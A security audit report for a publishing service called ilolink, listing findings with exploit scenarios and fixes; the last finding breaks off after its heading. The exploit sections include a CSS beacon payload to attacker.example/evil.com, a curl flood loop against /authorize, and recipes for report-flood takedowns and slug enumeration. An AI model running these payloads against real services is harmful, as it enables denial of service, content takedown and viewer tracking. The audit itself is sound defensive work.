# ilolink — Security Audit

**Date:** 2026-07-23  
**Commit audited:** `56b60a5` (main)  
**Scope:** all three workers (app / content-worker / mcp-worker) + shared `lib/`  
**Method:** 8 parallel surface auditors (high reasoning) → adversarial per-finding verification (false positives dropped) → manual curation. Supplemented with live header checks, `npm audit`, and secret-exposure checks.

> This is a point-in-time review, not a guarantee. It covers application logic; it does not include a live penetration test, a Cloudflare account-config review, or formal threat modeling of the hosting account.

---

## Executive summary

**Launch verdict: LAUNCHABLE after fixing the 2 HIGH findings.** No critical/RCE/data-breach class issues were found. Content sanitization, the sandboxed trusted-HTML model, SQL parameterization, OAuth/PKCE, and cross-request isolation are sound. The material risks are **abuse/griefing and missing rate limits** on the accountless surfaces (anonymous report takedown, unmetered MCP tools), plus standard hardening gaps.

| Severity | Count | Gist |
|---|---|---|
| Critical | 0 | — |
| **High** | 2 | Anonymous report-flooding takedown; MCP tools unmetered + `update_document` bypasses size/quota/abuse-scan |
| Medium | 7 | Admin key in URL; docx/OG DoS; unbounded workspace creation; enumerable unlisted slugs; missing app security headers; CF token in synced folder |
| Low | 12 | Rate-limit races, dashboard-token by-design bypass, CSS/img phone-home, view-count inflation, salt fail-open, etc. |
| Info | 11 | Hardening notes + confirmations of good practice |

### Fix before launch (blocking)
1. **Anonymous report takedown (HIGH)** — dedupe reporters by IP, not by attacker-controlled User-Agent; require admin confirmation (or a much higher, IP-diverse threshold) before auto-unpublish/auto-suspend.
2. **MCP tool abuse (HIGH)** — add a per-workspace rate limit around every mutating MCP tool; make `update_document` enforce the 2 MB text cap AND re-run the abuse `block` scan (today it bypasses both, so a benign doc can be swapped to phishing on the same live URL).

### Fix soon after launch
- Move `ADMIN_SECRET` out of the URL query (use a POST login → HttpOnly cookie or `Authorization` header); rotate it now (it's been shared in chat).
- Add security headers on the app origin (HSTS, nosniff, frame-ancestors, referrer-policy) — especially `/admin/*` and `/w/*`.
- Cap docx size / OG render cost; rate-limit `/api/og` and `/authorize` (workspace creation).
- Longer default slug (8–10 chars) for unlisted docs; rotate the CF API token and move it out of the cloud-synced folder.

---

## Findings

### High

#### 1. Abuse-report auto-takedown griefing: 'distinct reporter' dedupe keys on an attacker-controlled User-Agent
*Severity: High · `content-worker/src/index.ts`:595 · surface: abuse-dos-ratelimit*

**What:** postReport() dedupes reporters by reporter_hash = visitorHash(ip, ua, docId, salt) (lib/analytics/collect.ts:34-42 hashes ip+ua+docId). The User-Agent is fully attacker-controlled, so a single IP can manufacture unlimited 'distinct' reporters for any document. At REPORT_LIMIT = 3 distinct reporter_hashes (index.ts:589,638) autoActionDoc() unpublishes the doc (deletes its KV slug record -> 404). Each doc that trips this increments the owning workspace's abuse_flags, and at WS_REPORT_FLAG_LIMIT = 5 (index.ts:590,669) the ENTIRE workspace is suspended and every one of its live docs is 404'd. The per-IP rate limit is only rep:<ip> = 10/hour (index.ts:610), which does not constrain UA variation.

**Exploit:** Attacker picks a victim's public doc. From one IP they POST /_report three times to view.ilolink.com with the same doc id but three different User-Agent headers -> 3 distinct reporter_hashes -> doc auto-unpublished (9 requests, under the 10/hr cap needs only 3). Repeat against 5 different docs of the same workspace (spread over ~2 IPs or 2 hours to stay under 10/hr) -> workspace.abuse_flags reaches 5 -> suspendWorkspace path 404s ALL of the victim's documents. Total cost: ~15 unauthenticated HTTP requests to take an entire publisher offline; no Turnstile, no auth on /_report.

**Fix:** Count distinct reporters by a value the reporter cannot freely rotate (client IP, or IP /64) rather than by a hash that folds in User-Agent; and/or dedupe on IP alone. Do not auto-unpublish/suspend on raw report counts from anonymous reporters — gate autoActionDoc behind human moderation review, require a much higher and IP-diverse threshold, and rate-limit /_report per-IP AND globally per-doc. Log auto-actions for reversal.

#### 2. MCP tools have no rate limiting; update_document also bypasses quota, the 2 MB size cap, and the abuse scan
*Severity: High · `mcp-worker/src/agent.ts`:216 · surface: abuse-dos-ratelimit*

**What:** No MCP tool (publish/update/unpublish/search/list/get_analytics/fetch/get_dashboard_url) is rate-limited anywhere — index.ts just wraps IlolinkMCP.serve('/mcp') with no throttle, and agent.ts registers tools with no per-call limit. Only publish_document enforces a quota, and it is a count of LIVE docs (publish-core.ts:139-148), so a publish->unpublish->publish loop drives unlimited work. Worse, updateDoc() (mcp-worker/src/docs.ts:138-211) performs NO quota check, NO byteLength check against MAX_TEXT_BYTES (contrast publish-core.ts:206 which does check), and NEVER re-runs scanContent(). So update_document is an unmetered, unbounded-size, un-scanned mutation on any owned doc.

**Exploit:** Any holder of a workspace token (minted freely at /api/connect, 10/hr/IP) can: (a) call update_document in a tight loop with multi-MB text bodies — each call renders+sanitizes and writes a new R2 version with no size or rate ceiling, exhausting CPU/R2; and (b) publish a benign doc that passes the scanContent 'block' backstop, then immediately call update_document to swap in a phishing/credential-capture page — the block scan runs only in publishForWorkspace, never in updateDoc, so the safety net is fully bypassed while the share URL stays live. publish_document itself can be looped via unpublish to run unlimited docx conversions.

**Fix:** Add a per-workspace rate limit (KV/DO counter) around every mutating MCP tool. In updateDoc(): enforce byteLength(content) <= MAX_TEXT_BYTES on the text path, and run scanContent() on the new content with the same block behavior as publish. Consider counting lifetime publishes (not just live docs) toward abuse thresholds.

### Medium

#### 3. Live Cloudflare API token stored in plaintext .cf.env inside a cloud-synced project folder
*Severity: Medium · `.cf.env`:3 · surface: secrets-headers-config*

**What:** `.cf.env` contains a real, broadly-scoped Cloudflare credential: `CLOUDFLARE_API_TOKEN=[REDACTED]` plus `CLOUDFLARE_ACCOUNT_ID`. It is correctly git-ignored (.gitignore line for `.cf.env`) and verified NOT present in git history or `git ls-files` (0 matches), so this is not a repo/commit leak. The risk is at-rest exposure: the entire project tree lives under `/Users/wilsonbright/Desktop/Filen/projects/ilolink` — a Filen cloud-sync directory — so the plaintext production token is being synced/backed up to third-party storage. The file's own header comment even says 'LOCAL ONLY, never commit. Rotate after build session,' indicating it was meant to be ephemeral but is still on disk at launch time. A Cloudflare API token of this scope can deploy/overwrite all three Workers (push malicious code to ilolink.com / view.ilolink.com), and read R2/D1/KV (all document data).

**Exploit:** Anyone who gains read access to the synced Filen account, a device backup, or the local filesystem obtains a live token that can push arbitrary Worker code to the production origins and exfiltrate every stored document. No git access needed — the credential is at rest in a synced folder.

**Fix:** Rotate the token now (Cloudflare dashboard -> API Tokens -> Roll). Do not keep long-lived API tokens inside the project tree, especially one under a cloud-sync root; store deploy creds in the OS keychain or a secrets manager and export them only for the deploy shell, or move `.cf.env` outside the synced directory. Scope the token to least privilege (Workers Scripts:Edit + the specific R2/D1/KV needed) rather than a broad account token.

#### 4. ADMIN_SECRET (global moderation master key) is passed as a ?key= URL query parameter and embedded into the client RSC payload
*Severity: Medium · `app/admin/moderation/page.tsx`:33 · surface: auth-tokens*

**What:** The moderation surface authenticates with a single shared ADMIN_SECRET presented as ?key=<secret> on the page URL (app/admin/moderation/page.tsx:33-37, documented in lib/admin/gate.ts:1-3). Two problems compound: (1) putting a long-lived credential in a GET query string means it is recorded in Cloudflare edge/HTTP request logs (query strings are logged), the browser's history/autocomplete, and any intermediary that logs URLs; (2) the page then passes the same secret down into a client component as a prop — ActionButton adminKey={adminKey} (app/admin/moderation/page.tsx:108-154 → app/admin/moderation/actions.tsx:31) — so the secret is serialized into the React Flight/RSC response and the DOM sent to the browser, persisting in memory, history, and any full-page capture. This one secret authorizes platform-wide moderation: unpublish/restore any document and suspend/unsuspend any workspace via /api/admin/action.

**Exploit:** The admin visits https://ilolink.com/admin/moderation?key=SECRET. The full URL including SECRET is written to Cloudflare's request logs (and any Logpush/analytics sink) and to the admin's browser history. Anyone with read access to those logs, or to the admin's machine/browser sync, recovers SECRET and can then call POST /api/admin/action with header x-admin-key: SECRET to unpublish arbitrary documents or suspend arbitrary workspaces across the whole platform. Because the key is static and shared, there is no per-admin attribution and no easy revocation short of rotating the Worker secret.

**Fix:** Stop carrying the admin secret in the URL. Present it via a POST login that sets an HttpOnly, Secure, SameSite=Strict session cookie (or require the x-admin-key header for the page too, behind a small auth-exchange), so it never lands in query strings, logs, history, or the client payload. Keep the constant-time compare. Rotate ADMIN_SECRET after launch, and consider scoping/rotating it or moving to per-admin credentials given it is a global master key.

#### 5. /api/og: no rate limit, no cache headers, CPU-heavy satori render with a cache-buster, and an unguarded external font fetch
*Severity: Medium · `app/api/og/route.tsx`:31 · surface: abuse-dos-ratelimit*

**What:** GET /api/og renders a 1200x630 image via satori/ImageResponse (CPU-intensive) on every request. There is no rate limit (no middleware exists), the response sets no Cache-Control, and the image varies by the attacker-supplied ?t= title, so any CDN cache is trivially busted to force a fresh render each time. Additionally, on any cold isolate the route does `await fetch(<jsdelivr font URL>)` twice (lines 40-46) with no timeout, no error handling, and no fallback — a failed/slow CDN stalls or 500s the invocation, and a flood of cache-busted requests fans out font fetches to the third-party CDN.

**Exploit:** Hammer https://ilolink.com/api/og?t=<random-each-time>&f=md. Each unique title bypasses caching and forces a full satori render -> CPU/cost exhaustion of the app worker with unauthenticated GETs. Cold-isolate requests also trigger uncached external font fetches with no timeout; if jsdelivr is slow/unreachable the route hangs or throws, and the traffic can be aimed to amplify load onto the CDN.

**Fix:** Rate-limit /api/og (per-IP) and set an immutable public Cache-Control (e.g. s-maxage + stale-while-revalidate) so identical cards are served from cache. Self-host/bundle the Inter font instead of fetching jsdelivr at request time; if fetching, add a timeout and a fallback font, and cache the bytes durably. Reject/normalize titles beyond the 140-char cap already applied.

#### 6. Unbounded docx (mammoth) conversion — zip-bomb / CPU-memory DoS on the publish and update paths
*Severity: Medium · `lib/publish/formats.ts`:87 · surface: abuse-dos-ratelimit*

**What:** docxToHtml() feeds up to MAX_BINARY_BYTES (15 MB, formats.ts:56) of attacker-supplied docx (a ZIP) straight into mammoth.convertToHtml() with no timeout, no output-size cap, and no decompression guard. A 15 MB docx can be a zip bomb or contain pathologically large/nested document XML that expands to gigabytes or spins CPU, running inline in the request. On the MCP path this is reachable with NO Turnstile and NO rate limit (see the MCP finding) via publish_document and update_document.

**Exploit:** Craft a 15 MB .docx whose compressed streams expand enormously (or whose document.xml is deeply nested). Base64 it into publish_document.file_base64 (or update_document) repeatedly from a workspace token. Each call runs mammoth on the bomb with no ceiling, driving the Worker toward its 128 MB / CPU-time limits and causing OOM/timeouts; with no per-call rate limit the attacker sustains it.

**Fix:** Bound docx conversion: run mammoth under an explicit CPU/time budget (e.g. race against a timeout), reject archives whose total uncompressed size or entry count exceeds a sane cap before conversion, and cap the resulting HTML length. Combine with per-workspace rate limiting so a single caller cannot loop conversions.

#### 7. Unlisted documents are enumerable: 6-char default slug (~29 bits) served by an unauthenticated, un-rate-limited path
*Severity: Medium · `lib/slug.ts`:5 · surface: privacy-pii-data*

**What:** Default slugs are 6 characters over a 30-symbol alphabet (SLUG_ALPHABET, nanoSlug length 6) = ~29.4 bits ≈ 7.3e8 possibilities. For the 'unlisted' visibility tier the slug is the ONLY access control — the doc is fully served to anyone who knows the URL, and 'unlisted' is marketed as private-but-shareable. The content worker's document-serving path (content-worker/src/index.ts:1045-1119) applies NO rate limiting (unlike /_collect, /_feedback, /_comments, /_report which all call rateLimitKV). It returns a clean 200/401 for a live slug and 404 for a miss, a perfect existence oracle.

**Exploit:** An attacker scripts GET https://view.ilolink.com/<slug> across the ~7.3e8 6-char space (or ilolink.com/<slug> which reverse-proxies here). 404 vs 200 distinguishes real documents; each hit returns the full unlisted document body (and its OG title/description excerpt). At a few thousand req/s the space is exhaustible in days, harvesting effectively all unlisted documents — content users believed was unguessable. No token or password is needed for public/unlisted docs.

**Fix:** Rate-limit the document GET path per IP (as the interaction endpoints already are) and add global throttling on 404 rates. Increase default slug length (e.g., 10-12 chars ≈ 49-59 bits) or give unlisted docs a longer unguessable slug specifically. Consider serving an identical generic 404 with jittered timing to blunt the oracle.

#### 8. Unauthenticated unbounded workspace creation via POST /authorize (D1 resource-exhaustion DoS)
*Severity: Medium · `mcp-worker/src/authorize.ts`:97 · surface: mcp-connector*

**What:** The OAuth consent POST handler mints a fresh random subject and INSERTs a workspace row (getOrCreateByOauthSubject → createWorkspace) BEFORE calling helpers.completeAuthorization(). The only precondition to reach the insert is that `atob(form.get('state'))` is JSON-parseable — no valid OAuth client, no redirect_uri validation, no Turnstile, and no rate limit (grep confirms zero rate-limiting/turnstile anywhere in mcp-worker/src). The subject is a fresh crypto.randomUUID() every call, so getOrCreateByOauthSubject never finds an existing row and always creates a new one. This contrasts with the web path (app/api/connect/route.ts:20) which is IP-rate-limited to 10/hour.

**Exploit:** Attacker runs `curl -X POST https://mcp.ilolink.com/authorize -d 'state=e30='` (e30= is base64 of `{}`) in a loop. Each request inserts a new row into the shared `workspaces` D1 table before completeAuthorization is even attempted (and completeAuthorization failing on the bogus request does not roll back the insert). Thousands of requests/sec create unbounded rows in the D1 database shared by all three workers, driving up D1 storage/write costs and bloating the workspaces table (each row also carries quota_docs=50, status='active'). No authentication required.

**Fix:** Rate-limit the /authorize POST per IP (reuse lib/ratelimit as /api/connect does) and add the invisible Turnstile check used elsewhere. Critically, do not create the workspace until AFTER completeAuthorization succeeds and the OAuth request/redirect_uri/client have been validated — move getOrCreateByOauthSubject to run only once the grant is confirmed, or validate `parsed` (client_id, redirect_uri) before the insert.

#### 9. App origin (ilolink.com) sends no security headers
*Severity: Medium · `next.config.ts` · surface: secrets-headers-config*

**What:** The Next app worker returns no Strict-Transport-Security, X-Frame-Options/frame-ancestors CSP, X-Content-Type-Options, Referrer-Policy, or Permissions-Policy on any response (dashboard, /connect, /admin, /w/<token>, publish). Live-confirmed: none present.

**Exploit:** The login-free dashboards (/w/<token>) and the admin moderation page can be framed (clickjacking) since nothing sets X-Frame-Options/frame-ancestors. No HSTS means a first-visit SSL-strip/downgrade window. No Referrer-Policy means tokenized dashboard/connector URLs can leak in the Referer header to any outbound link the page renders.

**Fix:** Add a headers() block in next.config.ts (or middleware) setting: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload, X-Content-Type-Options: nosniff, Referrer-Policy: strict-origin-when-cross-origin, a CSP with frame-ancestors 'none' (or 'self') on app pages, and Permissions-Policy to disable unused features. Especially important on /admin/* and /w/*.

### Low

#### 10. Workspace rotation is authorized solely by knowing the workspace id, enabling silent takeover/lockout if the id leaks
*Severity: Low · `app/api/connect/rotate/route.ts`:18 · surface: idor-multitenancy*

**What:** POST /api/connect/rotate accepts a workspace_id in the request body and, for any active chatgpt_token workspace, migrates all its documents and the workspace row to a brand-new id, returning the new connector_url and dashboard_url to the caller. The only authorization is possession of the old id plus a per-IP rate limit (20/hour). This is consistent with the documented accountless model — for the ChatGPT path the id IS the bearer secret, so anyone holding it already has full access — so it is not a new privilege boundary break. It is flagged as info because the consequence is asymmetric: a party who learns a victim's ChatGPT workspace id can rotate it, receive the new id, and thereby lock the original owner out (their old connector/dashboard URL stops working) while retaining control themselves, with no notification to the original owner. Given the id is a long-lived URL-embedded secret, this raises the blast radius of any id disclosure from 'read' to 'account takeover'.

**Exploit:** Attacker obtains a victim's ChatGPT connector or dashboard URL (which embeds the raw id, e.g. from a shared link, referrer, or screenshot). Attacker POSTs {workspace_id: w_victim} to /api/connect/rotate, gets back {workspace_id: w_new, connector_url, dashboard_url}. The victim's original URLs now 404; the attacker holds the only working credentials to the victim's documents and analytics.

**Fix:** Accepted as by-design for the accountless bearer-secret model, but consider: (a) not returning the freshly-rotated id to an unauthenticated caller in a way that enables takeover, or requiring an additional proof-of-possession step; (b) rate-limiting rotation per-workspace, not just per-IP; and (c) documenting to users that the connector/dashboard URL must be treated strictly as a password. No code change required if the risk is formally accepted.

#### 11. Comments and feedback have no per-document cap — slow D1 storage exhaustion
*Severity: Low · `content-worker/src/index.ts`:834 · surface: abuse-dos-ratelimit*

**What:** postComment() inserts up to 4 KB bodies with only a per-IP KV limit (15/min) and no per-document or global row cap; postFeedback() note path (index.ts:540-569) inserts up to 2 KB with a 30/min/IP limit and no cap. commentsList caps DISPLAY at 500 rows but nothing caps stored rows. Combined with the KV limiter race and IP rotation, an attacker can accumulate unbounded comment/feedback rows in D1 over time.

**Exploit:** From rotating IPs (or exploiting the KV race for bursts), POST /_comments and /_feedback continuously against valid doc ids, writing thousands of 2-4 KB rows to bloat the comments/feedback tables and degrade D1 queries/backups. Low urgency (rate-limited per IP) but unbounded in aggregate.

**Fix:** Enforce a per-document (and per-workspace) cap on stored comments/notes, and/or a global insert budget. Prune or reject beyond the cap. Pair with a non-racy limiter (see the KV limiter finding).

#### 12. Visitor/reporter hash salt fails open to empty string — IP recovery becomes trivial if SALT_SECRET is unset
*Severity: Low · `content-worker/src/index.ts`:82 · surface: privacy-pii-data*

**What:** saltSecret(env) returns "" when the SALT_SECRET worker secret is missing (`return (env as ...).SALT_SECRET ?? ""`). That value is fed to visitorHash()/dailySalt() (collect.ts:28-42): dailySalt = SHA-256(utcDay + saltSecret) and visitorHash = SHA-256(dailySalt + ip + ua + docId). With saltSecret == "", the daily salt is SHA-256(YYYY-MM-DD) — a fully public, precomputable value with no secret at all. The hash then only mixes ip+ua+docId. These hashes are persisted as `reporter_hash` in D1 reports (migrations/0005_abuse.sql:8, explicitly annotated "no PII") and as blob7=visitor_hash in Analytics Engine. There is no startup check, no fail-closed, and no test asserting the secret is present; the beacon and report paths run normally and store the weak hash. SALT_SECRET appears only in .dev.vars.example — nothing enforces it in production.

**Exploit:** Suppose SALT_SECRET is never set with `wrangler secret put` on the content worker (an easy launch-day omission — it is a separate worker from the app and the same mistake for AE_SQL_TOKEN would only degrade dashboards, so it's plausible to miss). An adversary who obtains the reports table (or AE rows via a leaked AE_SQL_TOKEN, SQL export, backup, or subpoena) recovers exact viewer IPs: for a target row they know docId (public, embedded in every page as <meta name="ilo:doc">) and can enumerate common UA strings; the daily salt is public, so brute-forcing the entire IPv4 space (2^32 SHA-256s, seconds on a GPU) inverts each reporter_hash/visitor_hash to the exact IP that reported or viewed a document. This de-anonymizes abuse reporters and every visitor, defeating the whole cookieless-privacy claim.

**Fix:** Fail closed: if saltSecret is empty, drop the analytics/report write (or refuse to boot) rather than storing a secretless hash. At minimum throw at module init when SALT_SECRET is absent, and add a test that visitorHash output changes when the secret changes. Consider using an HMAC keyed by the secret rather than concatenation, and truncating stored hashes, so an unknown key is required to correlate at all.

#### 13. Analytics beacon /_collect is unauthenticated — anyone with a public doc id can inflate the 'exact' view counter and poison per-doc stats
*Severity: Low · `content-worker/src/index.ts`:867 · surface: privacy-pii-data*

**What:** POST /_collect accepts any JSON with a `doc` field and writes an Analytics Engine data point plus, for type=='pageview', an atomic increment of the per-doc ViewCounter Durable Object (lines 927-934). There is no nonce, no proof of an actual page load, and no tie to the served HTML. The doc id is public — it is embedded in every served page as <meta name="ilo:doc"> (index.ts:348) and also returned by /api/stats. The only guard is a 240/min/IP KV rate limit (line 883). The dashboard and MCP get_analytics present the ViewCounter value as the 'exact headline views' (api/stats/route.ts exactViews, dashboard page views()).

**Exploit:** Anyone who views a public/unlisted doc reads its doc id, then POSTs forged pageview/scroll/click/time beacons to https://view.ilolink.com/_collect?{doc:<id>,type:'pageview'}. At 240/min/IP = ~345k/day/IP (trivially multiplied across IPs/proxies) an attacker arbitrarily inflates a victim's 'exact' view count and pollutes their scroll-depth, referrer-host, country, and click-heatmap aggregates — fabricating engagement or burying real signal. Because the referrer host is attacker-controlled (blob3), they can also inject arbitrary referrer entries into a competitor's dashboard.

**Fix:** Bind beacons to a short-lived per-render token (issue a nonce in the served page, verify it in /_collect) or at least require the beacon's Origin/Referer to be view.ilolink.com and the doc id to correspond to a slug the request actually loaded. Treat the ViewCounter as approximate in the UI, and tighten/lower the /_collect rate limit.

#### 14. Comment and reaction data for password-protected documents is readable without the password
*Severity: Low · `content-worker/src/index.ts`:950 · surface: privacy-pii-data*

**What:** GET /_comments?doc=<id> (commentsList, lines 757-779) and GET /_feedback?doc=<id> (feedbackSummary, lines 502-513) resolve purely by document id and never consult the slug record's visibility/password_hash or the unlock cookie — unlike the document-serving path which enforces gateDoc/password. They return every visible comment (including author_name, a user-supplied PII field, and comment bodies) and reaction tallies for any doc id supplied.

**Exploit:** For a password-gated document, comment authors reasonably expect their names/comments are visible only to others who cleared the password. Any party who learns the doc id (e.g., it was public or unlisted before being switched to 'password', the id leaked via /api/stats output, a shared screenshot of the page's <meta ilo:doc>, or a browser extension) can call https://view.ilolink.com/_comments?doc=<id> and read all commenter names and bodies plus reaction counts without ever knowing the password. The password gate protects the body but not the discussion around it.

**Fix:** In commentsList/feedbackSummary, load the doc's slug record and, when visibility is 'password' (or 'expiring'/past deadline), require the same unlock cookie / expiry check that gateDoc enforces before returning comments/reactions.

#### 15. Dashboard token HMAC signature is bypassable — unsigned bare workspace id grants full dashboard access for Claude-OAuth workspaces
*Severity: Low · `lib/mcp/dashboard-token.ts`:43 · surface: idor-multitenancy*

**What:** verifyDashboardToken() has two branches. If the presented token contains no '~', it treats the whole string as a bare bearer id and returns it after only a format check (`/^w_[0-9A-Za-z]+$/`), performing NO HMAC verification. Only tokens that DO contain a '~' get their signature checked. The module's own header comment states the two token forms exist precisely because a Claude-OAuth workspace id 'is not a publish secret, so it is HMAC-signed to prevent enumeration.' But because the no-'~' branch accepts any well-formed id unsigned, that signing requirement can be defeated by simply omitting the `~<sig>` suffix. The consuming page app/(app)/w/[token]/page.tsx:49 feeds the resolved workspaceId straight into `SELECT ... FROM documents WHERE workspace_id = ?` and renders every document, slug, title, view count, and links to per-doc stats/comments — with no session and no further check that a bare (unsigned) token actually belongs to a chatgpt_token-origin workspace. So the HMAC control that is supposed to protect Claude-OAuth workspace ids provides zero protection: possession of the raw id alone opens the dashboard. Severity is held to low only because the id has ~95 bits of entropy (blind enumeration is infeasible) and no bare-id leak path for Claude-OAuth workspaces was found in this codebase; but the code directly contradicts its stated security model and the fix is trivial, so it should not ship as-is.

**Exploit:** A Claude-OAuth workspace's dashboard URL is minted signed as https://ilolink.com/w/w_ABC123...~<sig> (dashboard-token.ts:33). The signature is the only thing designated to gate access to that id. An attacker who obtains the raw id `w_ABC123...` in any context where it is treated as non-secret (the design explicitly assumes the id is NOT a secret for the OAuth path — e.g. an OAuth userId surfaced in a client, a log line, a support screenshot, or a future feature that echoes the id) can browse to https://ilolink.com/w/w_ABC123... with NO signature and receive the full private dashboard: every document, slug, title, view count, and the stats/comments links — read access to the entire workspace's analytics. The HMAC that was meant to prevent exactly this is never evaluated because the token has no '~'.

**Fix:** Do not let an unsigned bare id resolve to a Claude-OAuth workspace. Two options: (1) In verifyDashboardToken, return the id from the no-signature branch only as a 'bare/unverified' result, and have the dashboard page reject it unless the resolved workspace's origin === 'chatgpt_token' (the only origin whose id is legitimately a bearer secret); for claude_oauth, require and verify the HMAC signature. (2) Simpler: make signedDashboardUrl always append a signature and make verifyDashboardToken ALWAYS require a valid '~<sig>' (drop the bare-id acceptance entirely), issuing signed URLs for the ChatGPT path too. Either way, the page at app/(app)/w/[token]/page.tsx must never grant access to a claude_oauth workspace on an unsigned token.

#### 16. KV fixed-window rate limiter has a read-then-write TOCTOU race and relies on eventually-consistent KV
*Severity: Low · `lib/ratelimit.ts`:13 · surface: abuse-dos-ratelimit*

**What:** rateLimit() (and the identical rateLimitKV() in content-worker/src/index.ts:67-78) does `current = get(k)` then `put(k, current+1)` with no atomicity. KV has no atomic increment and is globally eventually consistent, so (a) concurrent requests within a window all read the same `current` and all pass, and (b) requests hitting different Cloudflare PoPs see stale counts for seconds. This weakens every limit built on it: publish (20/hr), connect (10/hr), rotate (20/hr), feedback (30/min), comments (15/min), report (10/hr), collect (240/min).

**Exploit:** Fire N requests concurrently (or spread across regions) against any KV-limited endpoint; because each reads current=0 before any write lands, far more than `limit` succeed per window. This amplifies the report-takedown and comment/feedback flooding vectors and blunts the publish/connect abuse caps. The publish endpoint is additionally Turnstile-gated so it's partly mitigated there, but the content-worker interaction endpoints have only this limiter.

**Fix:** Use a Durable Object (atomic in-DO counter) or Cloudflare's native Rate Limiting binding for limits that actually gate abuse, rather than KV read-modify-write. At minimum treat these counters as best-effort and layer a DO/edge limit on the security-relevant endpoints (/_report, publish, connect).

#### 17. docSecurityHeaders() omits Strict-Transport-Security on the untrusted document origin
*Severity: Low · `lib/sanitize/csp.ts`:106 · surface: secrets-headers-config*

**What:** docSecurityHeaders() (applied to every served document on view.ilolink.com, index.ts:1111) sets CSP, nosniff, no-referrer, X-Frame-Options: DENY, and Permissions-Policy — a strong set — but does not set Strict-Transport-Security. The document origin serves attacker-authored HTML and is the highest-risk surface, yet has no HSTS pin in code. Whether HSTS is applied depends entirely on out-of-band Cloudflare edge config that is not represented in the repo.

**Exploit:** A network attacker performing SSL-strip on a victim's first visit to a view.ilolink.com document link can serve content over HTTP; there is no HSTS to force HTTPS. Impact is bounded (docs are public content) but the unlock-cookie and any password-gate POST could be observed.

**Fix:** Add `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` to docSecurityHeaders() (and chromeHeaders()) so the pin is enforced in code rather than relying on edge configuration.

#### 18. Unrestricted CSS injection (no allowedStyles) + img-src https: lets any published doc phone home, bypassing the DNT/no-referrer privacy posture and enabling in-page UI redress
*Severity: Low · `lib/sanitize/html.ts`:37 · surface: xss-sanitize-csp*

**What:** The sanitizer allows the <style> tag (allowVulnerableTags:true) and the style attribute on every element (allowedAttributes['*'] includes 'style'), but sets no `allowedStyles`, so CSS is passed through VERBATIM. I confirmed this against the project's sanitize-html@2.17.6 with the real OPTIONS: `<style>@import "https://evil.com/x.css"; body{background:url(https://evil.com/leak)}</style>` and `style="background:url(...);position:fixed;top:0"` survive completely untouched (expression()/-moz-binding/behavior also survive but are dead vectors in modern browsers). Under the non-trusted doc CSP (lib/sanitize/csp.ts:65-85) the @import is blocked by `style-src 'unsafe-inline' https://fonts.googleapis.com`, BUT `img-src https: data:` (csp.ts:71) permits a CSS `url()` background/border-image to load from ANY https host. This is code-execution-safe (script-src is nonce-only, connect-src 'self'), but it defeats the product's stated privacy stance and permits UI redress.

**Exploit:** 1) Viewer tracking / deanonymization: publish any doc containing `<style>body{background:url(https://attacker.example/beacon?doc=SLUG)}</style>` (or an `<img src=https://attacker...>`). Every viewer's IP, User-Agent and timing are sent to attacker infrastructure on load. This fires even for viewers who set Do-Not-Track and even though the first-party tracker (tracker-script.ts) honors DNT and the response sets Referrer-Policy: no-referrer — the attacker's own CSS/img request ignores all of that. 2) In-page UI redress: `<style>` with `position:fixed;inset:0;z-index:...` can overlay the injected comment widget (widget.js) and the '⚑ Report' affordance (content-worker/src/index.ts:359) with attacker-controlled visuals to suppress reporting or phish commenters.

**Fix:** If external tracking/exfil matters, pass `allowedStyles` to restrict CSS properties/values (in particular forbid `url()` in background/border/list-style, and `position:fixed`) OR tighten `img-src` on the non-trusted CSP to `data:` + a first-party image proxy instead of blanket `https:`. At minimum document that any published page can beacon arbitrary hosts, so the DNT/no-referrer guarantees only cover first-party analytics, not embedded author content.

#### 19. searchDocuments LIKE builder does not escape the backslash escape character itself
*Severity: Low · `mcp-worker/src/docs.ts`:61 · surface: sql-injection*

**What:** The MCP `search` tool builds a LIKE pattern as `const like = \`%${query.replace(/[%_]/g, (m) => "\\" + m)}%\`;` and runs it with `... LIKE ? ESCAPE '\\'`. The replace escapes `%` and `_` but never escapes a literal backslash in the user query. Because `\` is declared as the ESCAPE character, any backslash the user types is interpreted as an escape introducer. This is NOT SQL injection — `like` is passed as a bound `?` parameter (line 70), so no SQL structure can be altered and the query is safe from injection. It is a correctness/robustness gap only. A backslash in the search term followed by an ordinary character produces an ill-formed escape sequence in the LIKE pattern (e.g. query `a\b` -> pattern `%a\b%`, where `\b` is not a valid escape target), and a backslash intended as a literal search character silently changes matching semantics rather than matching a backslash.

**Exploit:** Via the MCP `search` tool (mcp-worker/src/agent.ts:281 -> searchDocuments), a workspace owner searching their own docs for a term containing a backslash (e.g. `C:\path` or `foo\bar`) yields a malformed LIKE pattern. Best case the search silently mis-matches (backslash treated as escape, not literal); worst case SQLite rejects the pattern and the search errors out. No cross-tenant impact and no injection — workspace_id scoping and parameter binding both hold. Impact is limited to degraded/erroring search for the requesting workspace on its own data.

**Fix:** Escape the escape character first, before `%` and `_`: `query.replace(/[\\%_]/g, (m) => "\\" + m)` (i.e. include `\\` in the character class so a literal backslash becomes `\\`). Order matters only in that a single regex pass over the class `[\\%_]` handles all three correctly. This makes every user-supplied metacharacter a literal and removes the malformed-escape edge case.

#### 20. Per-request ctx.props is request-isolated (no cross-request leak), but the URL token is not re-validated after a session initializes
*Severity: Low · `mcp-worker/src/index.ts`:54 · surface: mcp-connector*

**What:** Reviewed the flagged isolation concern. Setting `(ctx as {props}).props` on the ExecutionContext (index.ts:54) is safe: Cloudflare gives each incoming request its own ExecutionContext, so props do not bleed across requests. Traced the SDK path: agents/mcp serve() passes `props: ctx.props` to getServerByName → partyserver setName() only re-runs onStart (and thus re-applies props) when the DO is cold (#ensureInitialized returns early once status==='started'; node_modules/agents/node_modules/partyserver/dist/index.js:705-713). Consequence: the workspace is bound to the streamable-http session DO at the INITIALIZE request and comes from DO storage thereafter; the per-request `/w_XXXX/mcp` URL token is not re-checked against the live session. This is not a cross-tenant escalation because session ids are unguessable (namespace.newUniqueId, ~256-bit). The practical caveat: token rotation does not invalidate an already-initialized MCP session, and after init the session id alone (not the URL token) is what authorizes calls.

**Exploit:** No cross-tenant exploit found; documented for completeness. If a ChatGPT connector token is rotated after a leak, any MCP session the attacker already initialized with the old token keeps working until that session DO is evicted, because warm-DO props are read from storage and the rotated URL token is ignored.

**Fix:** Optional hardening: on each request in the token path, re-verify that the resolved workspace still matches the session's stored workspaceId (reject on mismatch or when the workspace status flips to suspended/rotated), so token rotation and suspension take effect on live sessions rather than only new ones.

#### 21. ChatGPT bearer token travels in URL path and is captured by Workers observability logging
